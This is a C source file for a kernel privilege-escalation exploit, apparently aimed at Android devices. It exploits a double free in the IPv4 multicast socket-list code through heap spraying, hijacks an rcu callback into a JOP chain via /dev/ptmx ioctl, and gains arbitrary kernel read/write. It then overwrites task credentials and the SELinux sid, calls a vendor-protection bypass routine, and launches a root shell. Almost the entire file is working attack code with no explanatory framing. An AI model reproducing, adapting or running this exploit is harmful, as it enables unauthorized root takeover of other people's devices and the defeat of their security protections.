#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <errno.h>
#include <pthread.h>

/* ------------------ root define begin ------------------- */
#include "rootz.h"
#include "log.h"

/* adp args */
static int adp_sn;
static unsigned long adp_init_task;
static unsigned long adp_task_security_offset;
static unsigned long adp_task_cred_uid_offset;

static unsigned long adp_ptmx_fops;
static unsigned long adp_ptmx_ioctl_offset;
static unsigned long adp_patch_ptmx_ioctl_jop;

/*
  初始化适配参数
*/
#include "dict.h"

extern dict_t *transl_param_dict;

static int get_adp_ulval(char *name, unsigned long *value) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  *value = strtoul(var, NULL, 16);
  log_dump(LOG_DEBUG, "%s = 0x%lx\n", name, *value);
  return 1;
}

static int get_adp_str(char *name, char *value, int len) {
  char *var;

  if (!dict_get(transl_param_dict, name, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get %s failed\n", name);
    return 0;
  }
  strncpy(value, var, len);
  log_dump(LOG_DEBUG, "%s = %s, %d\n", name, value, strlen(value));
}

static int rootz_before(int argc, char *argv[]) {
  // 设置日志路径, 不设置打印到控制台
  // set_logfile_path("/data/local/tmp/8890.log");
  // 适配参数初始化
  if (parse_args(argc, argv) < 0) {
    log_dump(LOG_ERR, "[-] parse_args failed\n");
    return -1;
  }

  if(!transl_param_dict) return -1;

  char *var;

  /* root before */
  if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get n_sn failed\n");
    return -1;
  }
  adp_sn = atoi(var);
  log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);

  if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
  if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
  if(!get_adp_ulval(k_task_cred_uid_offset, &adp_task_cred_uid_offset)) return -1;
  if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
  if(!get_adp_ulval(k_ptmx_ioctl_offset, &adp_ptmx_ioctl_offset)) return -1;
  if(!get_adp_ulval(j_patch_ptmx_ioctl_jop, &adp_patch_ptmx_ioctl_jop)) return -1;

#if 1
  printf(" adp_init_task = 0x%lx\n", adp_init_task);
  printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
  printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
  printf(" adp_ptmx_ioctl_offset = 0x%lx\n", adp_ptmx_ioctl_offset);
  printf(" adp_patch_ptmx_ioctl_jop = 0x%lx\n", adp_patch_ptmx_ioctl_jop);

#endif


  return 0;
}

/*
  提权过后的操作
*/

static int rootz_after() {

  if(transl_param_dict) {
    vendor_protect_bypass(transl_param_dict);
    silly_everything_after_root(transl_param_dict);
  }

  if(transl_param_dict) {
    dict_destory(transl_param_dict);
    free(transl_param_dict);
  }

  return 0;
}


/* ------------------ root define end ------------------- */

#ifndef ONE_IGMP_H 
#define ONE_IGMP_H

#define __rcu

struct callback_head {
  struct callback_head *next;
  void (*func)(struct callback_head *head);
};
#define rcu_head callback_head

struct ip_sf_socklist {
  unsigned int  sl_max;
  unsigned int  sl_count;
  struct rcu_head   rcu;
  __be32    sl_addr[0];
};

struct ip_mc_socklist {
  struct ip_mc_socklist __rcu *next_rcu;
  struct ip_mreqn   multi;
  unsigned int  sfmode;   /* MCAST_{INCLUDE,EXCLUDE} */
  struct ip_sf_socklist __rcu *sflist;
  struct rcu_head   rcu;
};
#endif // ONE_IGMP_H

#define fake_iml_next_rcu (0x600000000) //struct ip_mc_socklist __rcu *next_rcu;


#define fake_iml_offset 0x6    // for bypass ipv6_addr_is_multicast(addr)
#define rcu_head_offset sizeof(struct ip_mc_socklist) - sizeof(struct rcu_head)

// #define adp_fake_iml_func adp_patch_ptmx_ioctl_jop

// #define FIX_MMAP_BUGS 1

// heap spray socket type
// #define IPV4
#ifdef IPV4
  #define SOCK_AF AF_INET
#else
  #define SOCK_AF AF_INET6
#endif


int PORT = 10086;

struct group_req gr_spray = { 0 };
struct sockaddr_in6 in6_spray = { 0 };

//***************************
//qqq spray struct 

  struct sockaddr_in spray_gr_si = {0};
  struct group_req spray_group = {0};
  char spray_buf[48];
  struct ip_msfilter *im;
//**********************
int ipv6_fd_pad[4096] = { 0 };
int ipv6_fd_spray[4096] = { 0 };
int free_hole_sockfd[4096] = {0};

int pad_times = 60;
int spray_times = 800;//250
int qqq_times = 1;//1000
int free_hole_times = 100;
int multi_times = 30;

// #define FORKCHILD 1
int children_num = 7;
int child_pids[8] = { 0 };


int server_init = 0;
int server_finish = 0;
int client_finish = 0;
int conntfd[2] = { 0 };
int connect_times = 2;

int fix_mmap = 1;

extern volatile int bind_cpu_id;

int set_fd_limit(){
  struct rlimit rlim;
  int ret;
  errno = 0;
  if ((ret = getrlimit(RLIMIT_NOFILE, &rlim))){
    printf("[E] get fd limit failed! error info: %s\n", strerror(errno));
    return ret;
  }

  printf("[I] changing fd limit from 0x%08x to 0x%08x success.\n", rlim.rlim_cur, rlim.rlim_max);

  rlim.rlim_cur = rlim.rlim_max;
  errno = 0;
  if((ret = setrlimit(RLIMIT_NOFILE, &rlim))){
    printf("[E] set file description limit failed! error info : %s\n", strerror(errno));
  }

  return ret;
}

static void init_fake_iml_obj(void) {
  unsigned long fake_kernel_func = adp_ptmx_fops + adp_ptmx_ioctl_offset;

  if (mmap((void*)fake_iml_next_rcu, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
    log_dump(LOG_ERR, "[-] mmap at %p failed.\n", (void*) fake_iml_next_rcu);

  struct ip_mc_socklist *iml = (void*)(fake_iml_next_rcu + fake_iml_offset);

#if 0

  char *jop_buf = (void*)&iml->rcu.next;
  *((unsigned long *)(jop_buf + 0x180)) = (unsigned long )jop_buf;
  *((unsigned long *)(jop_buf + 0x158)) = (unsigned long )(fake_kernel_func - 0xf8);
  *((unsigned long *)(jop_buf + 0x2d0)) = adp_patch_th_rwcap_jop;

#else
  char *jop_buf = (void*)&iml->rcu.next;
  int i;
  if (adp_sn == 101) {
    for (i = 0; i < 0x10; ++i) {
      if (j_jop1[i].index == 0 && j_jop1[i].addr == 0)
        break;
      if (j_jop1[i].addr == 0xaaaaaaaa)
        *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )jop_buf;
      else if (j_jop1[i].addr == 0xbbbbbbbb)
        *((unsigned long *)(jop_buf + j_jop1[i].index)) = (unsigned long )(fake_kernel_func - 0xf8);
      else
        *((unsigned long *)(jop_buf + j_jop1[i].index)) = j_jop1[i].addr;
    }
  } else if (adp_sn == 102) {
    for (i = 0; i < 0x10; ++i) {

      if (j_jop1[i].index == 0 && j_jop1[i].addr == 0)
        break;
      else
        *((unsigned long *)(j_jop1[i].index)) = j_jop1[i].addr;
    }
  } else {
    log_dump(LOG_ERR, "[-] not found j_jop2 adpter!\n");
    exit(-1);
  }

#endif

  iml->next_rcu = (void*) NULL;
  iml->rcu.next = (void*) NULL;
  iml->rcu.func = (void*) NULL;

  log_dump(LOG_DEBUG, "[*] iml : %p, &(iml->rcu.next) : %p\n", (void*)iml, &(iml->rcu.next));

}

static void *th_placeholder(void * arg) {
  bind_thread_on_cpu(bind_cpu_id);
  struct rcu_head* head = (void*)(fake_iml_next_rcu + fake_iml_offset + rcu_head_offset);
  log_dump(LOG_DEBUG, "[!] original value head: %p, head->next : %p, head->func : %p\n", head, head->next, head->func);

  while (1) {
    if ( head->next ) {
      head->func = (void*) adp_patch_ptmx_ioctl_jop;
      break;
    }
  }

  log_dump(LOG_DEBUG, "[!] fake_iml_next_rcu was modified to : head->next : %p, head->func : %p\n", head->next, head->func);
  while(1){}
  return NULL;
}

static int prepare_spray_obj(int fd,struct ip_msfilter *imq) 
{

  return setsockopt(fd, IPPROTO_IP, IP_MSFILTER, imq,48);
}


static int prepare() {
  int i, ret,j,k;

  int times = pad_times / 2;

  for (i = 0; i < free_hole_times; ++i) {
    if ((free_hole_sockfd[i] = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP)) < 0) {
      log_dump(LOG_DEBUG,"[-] socket() failed.\n");
    }

    for (j = 0; j < multi_times; ++j)
    {
      spray_gr_si.sin_addr.s_addr = 0xe0+(j*0x1000000);
      memcpy(&spray_group.gr_group, &spray_gr_si, sizeof(spray_gr_si));
      ret = setsockopt(free_hole_sockfd[i], SOL_IP, MCAST_JOIN_GROUP, &spray_group, sizeof(spray_group));
      if (ret<0)
      {
        //printf("[prepare setsockopt spray failed at free_hole_sockfd[%d]]\n",i );
        //perror("prepare setsockopt free_hole_sockfd");
      }

    }
  }


  log_dump(LOG_DEBUG,"[*] Create spray socket fd spray %d times.\n", spray_times);
  int c;
  for ( i = 0 ; i < spray_times ; i++ ) {
    if ((ipv6_fd_spray[i] = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP)) < 0) {
      log_dump(LOG_DEBUG,"[-] socket() failed.\n");
    }


    for (j = 0; j < multi_times; ++j)
    {
      spray_gr_si.sin_addr.s_addr = 0xe0+(j*0x1000000);
      memcpy(&spray_group.gr_group, &spray_gr_si, sizeof(spray_gr_si));
      ret = setsockopt(ipv6_fd_spray[i], SOL_IP, MCAST_JOIN_GROUP, &spray_group, sizeof(spray_group));
      if (ret<0)
      {
        //printf("[prepare fd spray setsockopt spray failed at spray_fd[%d]]\n",i );
        //perror("prepare setsockopt spray");
      }
    }
  }

  log_dump(LOG_DEBUG,"[*] Create spray socket fd pad %d times.\n", pad_times);

  for (i = 0; i < pad_times ; i++ ) {
    if ((ipv6_fd_pad[i] = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP)) < 0) {
      log_dump(LOG_DEBUG,"[-] socket() failed.\n");
    }

    for (j = 0; j < multi_times; ++j)
    {
      spray_gr_si.sin_addr.s_addr = 0xe0+(j*0x1000000);
      memcpy(&spray_group.gr_group, &spray_gr_si, sizeof(spray_gr_si));
      ret = setsockopt(ipv6_fd_pad[i], SOL_IP, MCAST_JOIN_GROUP, &spray_group, sizeof(spray_group));
      if (ret<0)
      {
        //printf("[prepare fd_pad setsockopt spray failed at spray_fd[%d]]\n",i );
        //perror("prepare setsockopt spray");
      }
    }
  }


#if 1
  pthread_t th_check;
  if(pthread_create(&th_check, NULL, th_placeholder, NULL))
    log_dump(LOG_DEBUG,"[-] placeholder thread error.\n");
#endif

  int cnt = 0;

  for (i = 0; i < times; i++) {
    for (int j = 0; j < qqq_times; ++j)
    {
      for (k = 0; k < multi_times; ++k)
      {
        im->imsf_multiaddr.s_addr = 0xe0+(k*0x1000000);        
        ret = prepare_spray_obj(ipv6_fd_pad[i],im);
        /*if (ret<0)
        {
          perror("\t391 set err");
        }*/
      }
    }   
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  log_dump(LOG_DEBUG, "[+] spray ipv6 obj(%d times) done, not yet close.\n", times);

  log_dump(LOG_DEBUG, "[cpu] process(%d) now bind on cpu[%d].\n", getpid(), sched_getcpu());

  return 0;
}



static void *th_client_connect(void *arg) {
  bind_thread_on_cpu(bind_cpu_id);
  int sockfd, i;

  struct sockaddr_in si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("127.0.0.1"),
  };

  while(!server_init)
    usleep(1);

  log_dump(LOG_DEBUG, "accept times %d\n", connect_times);

  for ( i = 0 ; i < connect_times ; i++ ) {
    sockfd = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP);

    if (connect(sockfd, (struct sockaddr*)&si, sizeof(si)) != 0 ) {
      log_dump(LOG_ERR, "[-] client-%d connected failed.\n", i);
    }
    close(sockfd);
  }
  client_finish = 1;
  while(1) {}
  pthread_exit(0);
}

static void spray_to_free_hole() {
  int times = 100;
  int sockfd[times];
  int i, j,k,ret;
/*
  for (i = 0; i < times; ++i) {
    if ((sockfd[i] = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP)) < 0) {
      log_dump(LOG_DEBUG,"[-] socket() failed.\n");
    }
    ret = setsockopt(sockfd[i], SOL_IP, MCAST_JOIN_GROUP, &spray_group, sizeof(spray_group));
    if (ret<0)
    {
      printf("[prepare setsockopt spray failed at spray_fd[%d]]\n",i );
      perror("prepare setsockopt spray");
    }
  }
*/
  int cnt = 0;

  for (i = 0; i < free_hole_times; i++, cnt = 0) {
    for (j = 0; j < qqq_times; ++j)
    {
      for (k = 0; k < multi_times; ++k)
      {
        im->imsf_multiaddr.s_addr = 0xe0+(k*0x1000000);        
        ret = prepare_spray_obj(free_hole_sockfd[i],im);
        /*if (ret<0)
        {
          perror("\t469 set err");
        }*/
      }
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  for (i = 0; i < free_hole_times; ++i)
    close(free_hole_sockfd[i]);

  struct rcu_head* head = (void*)(fake_iml_next_rcu + fake_iml_offset + rcu_head_offset);
  log_dump(LOG_DEBUG,"[*] close(conntfd[1] before: head->next : %p, head->func = %p\n", head->next, head->func);


  log_dump(LOG_DEBUG,"[!] secound free mc_list obj.\n");
  if ( connect_times != 1 )
    close(conntfd[1]);

  log_dump(LOG_DEBUG,"[*] close(conntfd[1] after: head->next : %p, head->func = %p\n", head->next, head->func);

  while(1) {
    if ( head->next ) {
      head->func = (void*) adp_patch_ptmx_ioctl_jop;
      break;
    }
  }
  log_dump(LOG_DEBUG,"[+] head->next : %p, head->func = %p\n", head->next, head->func);

}


static int trigger() {
  int i, ret,j,k;
  int times = pad_times / 2;

  int server_sockfd;

  server_sockfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC , IPPROTO_IP);

  struct sockaddr_in gr_si = { 
    .sin_family = AF_INET, 
    .sin_port = htons(PORT),
    .sin_addr = inet_addr("224.0.0.0"), // multicast address
  };

  struct group_req group;
  group.gr_interface = 2;
  memcpy(&group.gr_group, &gr_si, sizeof(gr_si));

  if (setsockopt(server_sockfd, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof(group)) == -1)
    log_dump(LOG_DEBUG,"[-] setsockopt failed.\n");

  struct sockaddr_in serv_addr = {};
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  bind(server_sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

  listen(server_sockfd, 2);
  
  pthread_t th_client;
  // Create a client thread to connect.
  if ( pthread_create(&th_client, NULL, th_client_connect, NULL))
    log_dump(LOG_DEBUG,"[-] th_client_connect failed.\n");

  server_init = 1;

  for ( i = 0 ; i < connect_times ; i++ ) {
    conntfd[i] = accept4(server_sockfd, NULL, NULL, 0);
    if(conntfd[i] >= 0 ) {
      log_dump(LOG_DEBUG,"[+] accept() succeed.\n");
    } else {
      log_dump(LOG_DEBUG,"[-] accept() failed.\n");
    }
  }

  while(!client_finish)
    usleep(1);

  server_finish = 1;

  int cnt = 0;
  for (i = times; i < pad_times; i++, cnt = 0) {
    for (j = 0; j < qqq_times; ++j)
    {
      //ret = prepare_spray_obj(ipv6_fd_pad[i], im);
      for (k = 0; k < multi_times; ++k)
      {
        im->imsf_multiaddr.s_addr = 0xe0+(k*0x1000000);        
        ret = prepare_spray_obj(ipv6_fd_pad[i],im);
/*        if (ret<0)
        {
          perror("\t565 set err");
        }*/
      }
    }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }


  // first free...
  log_dump(LOG_DEBUG,"[!] first free mc_list obj.\n");
  if (conntfd[0] ) 
    close(conntfd[0]);

  // release hole.
  for (i = 0 ; i < pad_times; i++ )
    close(ipv6_fd_pad[i]);

  log_dump(LOG_DEBUG,"[*] %d times to spray for the hole.\n", spray_times);

  for (i = 0; i < spray_times; i++, cnt = 0) {
      for (int j = 0; j < qqq_times; ++j)
      //for (int j = 0; j < 1; ++j)
      {
        //ret = prepare_spray_obj(ipv6_fd_spray[i], im);
        for (k = 0; k < multi_times; ++k)
        {
          im->imsf_multiaddr.s_addr = 0xe0+(k*0x1000000);        
          ret = prepare_spray_obj(ipv6_fd_spray[i],im);
          /*if (ret<0)
          {
            perror("\t596 set err");
          }*/
        }
      }
    // LOGV("[*] %d while spray obj cnt %d\n", i, cnt);
  }

  log_dump(LOG_DEBUG, "[cpu] process(%d) now bind on cpu[%d].\n", getpid(), sched_getcpu());

#if FORKCHILD
  log_dump(LOG_DEBUG,"[*] kill chilren by fork()?\n");
  for ( i = 0 ; i < children_num ; i++ ) {
    log_dump(LOG_DEBUG,"kill pid : %d\n", child_pids[i]);
    kill(child_pids[i], SIGKILL);
  }
  wait(NULL);
  
  log_dump(LOG_DEBUG,"[+] All killed\n");
#endif 

  // begin padding the free hole!
  spray_to_free_hole();

  return 0;
}

static int fake_ptmx_ioctl() {
  log_dump(LOG_DEBUG, "[!!!] test for ptmx ioctl patch addr...\n");
  int fd;
  unsigned long ret;

  errno = 0;
  fd = open("/dev/ptmx", O_RDWR, 0);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  int x1 = 0x41;
  char *jop_buf = (char *)0x0c100000;

  errno = 0;
  if (mmap((void*)jop_buf, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
    log_dump(LOG_ERR, "[-] mmap false, errno = %d, msg = %s\n", errno, strerror(errno));

  log_dump(LOG_DEBUG, "[+] jop_buf = %p\n", jop_buf);

#if 0

  // kernel_sock_ioctl set_fs func
  *((unsigned long *)jop_buf) = adp_kernel_set_fs;
  *((unsigned long *)(jop_buf + 0x28)) = (unsigned long)jop_buf;
  *((unsigned long *)(jop_buf + 0x48)) = (unsigned long) adp_fix_ptmx_ioctl_x20_reg_jop;

  // fix x20 jop code
  *((unsigned long *)(jop_buf + 0x90)) = (unsigned long)jop_buf;
  *((unsigned long *)(jop_buf + 0x10)) = (unsigned long)adp_ptmx_ioctl_x20_value;
  *((unsigned long *)(jop_buf + 0x8)) = (unsigned long)fake_kernel_func_ret;
#else
  int i;
  if (adp_sn == 101) {
    for (i = 0; i < 0x10; ++i) {
    if (j_jop2[i].index == 0 && j_jop2[i].addr == 0)
      break;
    if (j_jop2[i].addr == 0xbbbbbbbb || j_jop2[i].addr == 0xdddddddd)
      *((unsigned long *)(jop_buf + j_jop2[i].index)) = (unsigned long )jop_buf;
    else
      *((unsigned long *)(jop_buf + j_jop2[i].index)) = j_jop2[i].addr;
    }
  } else if (adp_sn == 102) {
    for (i = 0; i < 0x10; ++i) {
    if (j_jop2[i].index == 0 && j_jop2[i].addr == 0)
      break;
    else
      *((unsigned long *)(j_jop2[i].index)) = j_jop2[i].addr;
    }
  } else {
    log_dump(LOG_ERR, "[-] not found j_jop2 adpter!\n");
    exit(-1);
  }


#endif

  ret = ioctl(fd, 0x0c100000, (void *)jop_buf);
  // ret = ioctl(fd, 0x42, (void *)0x4040);
  if (ret < 0) {
    log_dump(LOG_ERR, "[-] ioctl false, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  log_dump(LOG_DEBUG, "[+] ioctl ret = 0x%lx\n", ret);
  return 0;

}

static int fake_sel_task_prctl() {
  // SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3, unsigned long, arg4, unsigned long, arg5)
  prctl(0x41, 0x42, 0x43, 0x44, 0x45);
  return 0;
}

static int fake_kernel_func_callback() {
#if 1
  return fake_ptmx_ioctl();
#else
  return fake_sel_task_prctl();
#endif
}

static void *th_fix_mmap_area(void *arg) {
  bind_thread_on_cpu(bind_cpu_id);
  int value;
  unsigned long check_mem = (unsigned long) fake_iml_next_rcu + fake_iml_offset + rcu_head_offset;
  while(fix_mmap) {
    if (pipe_read_memory((void*)check_mem, (void*)&value, sizeof(value)) != sizeof(value)) {
      log_dump(LOG_DEBUG, "[!] 0x%lx mmap area need fix to remap\n", check_mem);

      if (mmap((void*)fake_iml_next_rcu, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0)
        log_dump(LOG_ERR, "[-] 0x%lx re mmap false, errno = %d, msg = %s\n", check_mem, errno, strerror(errno));

      usleep(300 * 1000);
    }
  }

  pthread_exit(0);
}

static void exploit_slab64(int argc, char *argv[]) {
  set_bind_cpu_id();

#if FORKCHILD
  int i;
  for ( i = 0; i < children_num ; i++ ) {
    if ( (child_pids[i] = fork() ) == 0 ) {
      log_dump(LOG_DEBUG, "I'm child : %d\n", i);
      while(time((time_t*)NULL));
    }
  }
#endif

  bind_process_on_cpu(bind_cpu_id);

  log_dump(LOG_NORMAL, "\t[1] padding data to fake obj.\n");
  init_fake_iml_obj();

  log_dump(LOG_NORMAL, "\t[2] prepare heap spray data.\n");
  if (prepare() < 0 )
    log_dump(LOG_ERR, "[-] prepare failed.\n");


#ifdef FIX_MMAP_BUGS
  log_dump(LOG_DEBUG, "[?] fix mmap bugs???\n");
  pthread_t th_fix_mmap;
  if(pthread_create(&th_fix_mmap, NULL, th_fix_mmap_area, NULL))
    log_dump(LOG_ERR, "[-] fix_mmap_th failed.\n");
#endif
 
  log_dump(LOG_NORMAL, "\t[3] trigger exploit.\n");
  if (trigger() < 0 )
    log_dump(LOG_ERR, "[-] trigger failed.\n");

  sleep(1);
  log_dump(LOG_NORMAL, "\t[4] test for r/w kernel capacity\n");

  unsigned long rw_cap;
  fix_mmap = 1;
  while (1) {
    log_dump(LOG_DEBUG, "[!] jop to patch thread_info.addr_limit\n");
    fake_kernel_func_callback();
    if (pipe_read_memory((void*)adp_ptmx_fops, (void*)&rw_cap, sizeof(rw_cap)) == sizeof(rw_cap)) {
      log_dump(LOG_NORMAL, "[+] cat arbitrary read/write succeeded 0x%lx = 0x%lx\n", adp_ptmx_fops, rw_cap);
      break;
    }
    usleep(300 * 1000);
  }

  log_dump(LOG_NORMAL, "\t[5] get root, patch cred & sid\n");
  
  char random_name[0x10] = { 0 };
  set_random_task_name(4, random_name);

  obtain_root_by_task_name(adp_init_task, random_name, adp_task_security_offset, adp_task_cred_uid_offset);

  log_dump(LOG_DEBUG, "\t[!] patch memory for something.\n");

  patch_memory(1, p_patch);

}

void test(int argc, char *argv[]) {
  // parse_args(argc, argv);
  rootz_before(argc, argv);
  rootz_after();

  exit(0);
}

int main(int argc, char *argv[]) {
  // test(argc, argv);
  set_fd_limit();

  spray_gr_si.sin_family = AF_INET;
  spray_gr_si.sin_port = htons(10086);
  spray_gr_si.sin_addr.s_addr = 0xe0;


  spray_group.gr_interface = 1;
  memcpy(&spray_group.gr_group, &spray_gr_si, sizeof(spray_gr_si));

  memset(spray_buf,0,48);
  im = (struct ip_msfilter *)&spray_buf;  

  im->imsf_multiaddr.s_addr = 0xe0; 
  im->imsf_interface.s_addr = inet_addr("127.0.0.1");//0x17f; 
  im->imsf_fmode = 0; 
  im->imsf_numsrc = 6; 
  im->imsf_slist[0].s_addr = 0;


  if(rootz_before(argc, argv)) {
    log_dump(LOG_ERR, "[-] rootz_before failed!\n");
    return -1;
  }

  log_dump(LOG_NORMAL, "\t[*] start, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  exploit_slab64(argc, argv);

  log_dump(LOG_NORMAL, "\t[*] end, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  if(rootz_after()) {
    log_dump(LOG_ERR, "[-] rootz_after failed!\n");
  }

  fprintf(stderr, "end...\n");

  system("USER=ROOT /system/bin/sh");

  printf("hang up...\n");


  while(1);

  return 0;
}